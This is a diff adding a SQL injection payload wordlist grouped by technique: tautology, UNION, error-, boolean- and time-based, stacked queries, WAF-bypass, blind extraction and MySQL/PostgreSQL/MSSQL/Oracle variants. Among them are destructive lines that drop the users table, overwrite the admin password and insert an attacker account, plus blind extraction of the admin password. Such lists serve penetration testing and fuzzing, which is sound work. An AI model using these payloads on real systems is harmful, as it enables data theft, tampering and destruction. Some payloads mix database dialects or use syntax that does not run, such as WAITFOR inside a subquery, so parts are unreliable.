@@ -1,0 +1,86 @@
+# Basic SQL Injection Payloads
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' #
+' OR '1'='1' /*
+" OR "1"="1
+" OR "1"="1" --
+" OR "1"="1" #
+" OR "1"="1" /*
+
+# Union-Based SQL Injection Payloads
+1' UNION SELECT null--
+1' UNION SELECT null,null--
+1' UNION SELECT null,null,null--
+1' UNION SELECT version(),null--
+1' UNION SELECT database(),null--
+1' UNION SELECT user(),null--
+1' UNION SELECT table_name,null FROM information_schema.tables--
+1' UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users'--
+
+# Error-Based SQL Injection Payloads
+1' AND 1=CONVERT(int, (SELECT @@version))--
+1' AND 1=CAST((SELECT @@version) AS int)--
+1' AND 1=CONVERT(int, (SELECT db_name()))--
+1' AND 1=CAST((SELECT db_name()) AS int)--
+
+# Boolean-Based SQL Injection Payloads
+1' AND 1=1--
+1' AND 1=2--
+1' OR 1=1--
+1' OR 1=2--
+1' AND ASCII(SUBSTRING((SELECT TOP 1 table_name FROM information_schema.tables),1,1))>64--
+
+# Time-Based SQL Injection Payloads
+1' AND IF(1=1, SLEEP(5), 0)--
+1' AND IF(1=2, SLEEP(5), 0)--
+1' AND IF(ASCII(SUBSTRING((SELECT TOP 1 table_name FROM information_schema.tables),1,1))>64, SLEEP(5), 0)--
+
+# Stacked Queries (Batch Execution)
+1'; DROP TABLE users--
+1'; UPDATE users SET password='hacked' WHERE user='admin'--
+1'; INSERT INTO users (username, password) VALUES ('hacker', 'pwned')--
+
+# Bypassing WAF (Web Application Firewall) Payloads
+1'/**/OR/**/'1'='1
+1'/*!50000OR*/'1'='1
+1'||'1'='1
+1'||'1'='1'--
+1'||'1'='1'#
+1'||'1'='1'/*
+
+# Obfuscated Payloads
+1' AND 'foo' LIKE 'bar'--
+1' AND 'foo' LIKE 'foo'--
+1' AND 'foo' = 'foo'--
+1' AND 'foo' = 'bar'--
+
+# Blind SQL Injection Payloads
+1' AND (SELECT COUNT(*) FROM users) > 0--
+1' AND (SELECT COUNT(*) FROM users) = 0--
+1' AND (SELECT LENGTH(table_name) FROM information_schema.tables LIMIT 1) > 5--
+1' AND (SELECT ASCII(SUBSTRING(table_name,1,1)) FROM information_schema.tables LIMIT 1) > 64--
+
+# Advanced Payloads
+1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database()) > 0--
+1' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users') > 0--
+1' AND (SELECT ASCII(SUBSTRING(column_name,1,1)) FROM information_schema.columns WHERE table_name='users' LIMIT 1) > 64--
+1' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin') > 64--
+
+# MySQL-Specific Payloads
+1' AND (SELECT 1 FROM (SELECT SLEEP(5))x)--
+1' AND (SELECT 1 FROM (SELECT BENCHMARK(1000000,MD5('test')))x)--
+1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--
+
+# PostgreSQL-Specific Payloads
+1' AND (SELECT 1 FROM pg_sleep(5))--
+1' AND (SELECT 1 FROM (SELECT pg_sleep(5))x)--
+1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)y)--
+
+# MSSQL-Specific Payloads
+1' AND (SELECT 1 FROM (SELECT WAITFOR DELAY '0:0:5')x)--
+1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,CAST(FLOOR(RAND()*2) AS CHAR))x FROM information_schema.tables GROUP BY x)y)--
+
+# Oracle-Specific Payloads
+1' AND (SELECT 1 FROM (SELECT DBMS_LOCK.SLEEP(5) FROM dual)x)--
+1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT banner FROM v$version WHERE rownum=1),0x3a,CAST(FLOOR(DBMS_RANDOM.VALUE(0,2)) AS CHAR))x FROM dual GROUP BY x)y)--
